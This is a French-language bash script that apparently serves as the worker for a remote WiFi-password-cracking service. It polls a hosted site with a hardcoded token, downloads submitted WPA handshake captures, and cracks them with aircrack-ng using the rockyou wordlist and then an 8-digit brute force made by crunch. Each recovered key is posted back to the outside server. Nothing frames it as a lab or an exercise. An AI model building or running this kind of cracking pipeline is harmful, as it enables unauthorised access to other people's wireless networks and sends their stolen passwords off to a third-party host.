#!/bin/bash
SITE_URL="https://wifi-wpa.byethost3.com"
TOKEN="MonTokenSecret123456"

report() {
    curl -s -o /dev/null -X POST -d "progress=$1" "${SITE_URL}/api_progress.php?token=${TOKEN}&job_id=${JOB_ID}" 2>/dev/null || true
}

echo "🔍 Vérification des tâches..."
RESPONSE=$(curl -s "${SITE_URL}/api_status.php?token=${TOKEN}")
JOB_ID=$(echo "$RESPONSE" | jq -r '.job.id' 2>/dev/null)

if [ "$JOB_ID" == "null" ] || [ -z "$JOB_ID" ]; then
    echo "✅ Aucune tâche."
    exit 0
fi

report "📥 Téléchargement du fichier..."
curl -s -o "capture_${JOB_ID}.cap" "${SITE_URL}/api_download.php?token=${TOKEN}&id=${JOB_ID}"

if [ ! -f "capture_${JOB_ID}.cap" ] || [ ! -s "capture_${JOB_ID}.cap" ]; then
    report "❌ Fichier vide ou introuvable"
    curl -s -X POST -d "id=${JOB_ID}&status=failed&password=" "${SITE_URL}/api_update.php?token=${TOKEN}"
    exit 1
fi

SIZE=$(stat -c%s "capture_${JOB_ID}.cap" 2>/dev/null || stat -f%z "capture_${JOB_ID}.cap" 2>/dev/null)
report "📁 Fichier téléchargé (${SIZE} octets)"

report "🔐 Test rockyou.txt..."
aircrack-ng -w /usr/share/wordlists/rockyou.txt "capture_${JOB_ID}.cap" > result.txt 2>&1

if grep -q "KEY FOUND" result.txt; then
    PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}')
    report "✅ Mot de passe trouvé (rockyou) : ${PWD}"
    curl -s -X POST -d "id=${JOB_ID}&status=cracked&password=${PWD}" "${SITE_URL}/api_update.php?token=${TOKEN}"
    rm -f "capture_${JOB_ID}.cap" result.txt
    exit 0
fi

report "❌ Rockyou échec. Démarrage force brute 8 chiffres..."

crunch 8 8 0123456789 -o wordlist_custom.txt 2>/dev/null

if [ -f wordlist_custom.txt ] && [ -s wordlist_custom.txt ]; then
    report "🔐 Force brute en cours... (cela peut prendre 30-60 min)"
    
    aircrack-ng -w wordlist_custom.txt "capture_${JOB_ID}.cap" > result.txt 2>&1
    
    if grep -q "KEY FOUND" result.txt; then
        PWD=$(grep "KEY FOUND" result.txt | awk -F'[][]' '{print $2}')
        report "✅ Mot de passe trouvé (brute force) : ${PWD}"
        curl -s -X POST -d "id=${JOB_ID}&status=cracked&password=${PWD}" "${SITE_URL}/api_update.php?token=${TOKEN}"
        rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt
        exit 0
    fi
    
    report "❌ Force brute échec."
else
    report "❌ Crunch n'a pas généré la wordlist"
fi

curl -s -X POST -d "id=${JOB_ID}&status=failed&password=" "${SITE_URL}/api_update.php?token=${TOKEN}"
rm -f "capture_${JOB_ID}.cap" result.txt wordlist_custom.txt
report "✅ Terminé (échec)"
